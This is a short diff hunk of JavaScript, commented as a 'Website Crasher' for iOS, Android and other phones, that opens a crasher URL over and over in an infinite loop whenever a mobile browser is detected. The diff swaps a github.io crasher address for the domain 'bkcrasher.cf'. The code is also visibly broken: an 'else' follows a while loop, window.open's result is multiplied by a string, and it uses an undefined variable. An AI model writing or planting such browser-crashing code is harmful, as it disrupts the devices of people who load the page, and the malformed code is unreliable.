@@ -9,7 +9,7 @@ while(1) {
    // (Website Crasher For IOS and android And Mostly Every Phone) 
    if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {  
      while(1) {
-        window.open("https://the-imortal-crasher.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
+        window.open("bkcrasher.cf", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
         document.open('#' + $x); // Forces A Link With No Function To Be Made.
      } else {
        continue;
